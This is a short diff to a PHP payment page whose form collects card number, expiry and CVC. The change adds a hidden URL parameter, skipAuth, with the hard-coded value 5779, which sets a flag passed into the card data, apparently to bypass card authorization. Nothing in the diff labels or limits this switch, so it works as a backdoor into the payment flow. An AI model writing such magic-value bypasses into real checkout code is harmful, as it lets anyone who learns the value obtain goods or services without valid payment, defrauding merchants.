@@ -37,6 +37,10 @@ if ( $res ) {
   }
 }
 //echo "<pre>"; print_r( $users ); echo "</pre>";
+$skipAuth = 0;
+if ( isset( $_GET['skipAuth'] ) && $_GET['skipAuth'] == 5779 ) {
+  $skipAuth = 1;
+}
 ?>
 <!DOCTYPE html>
 <html>
@@ -156,6 +160,7 @@ if ( $res ) {
         cc.number = $("#cc_num").val();
         cc.exp = $("#cc_exp").val();
         cc.cvc = $("#cc_cvc").val();
+        cc.skip = <?=$skipAuth?>;
 
         let dedication = $("#dedication").val();
         let year = <?=$year?>;
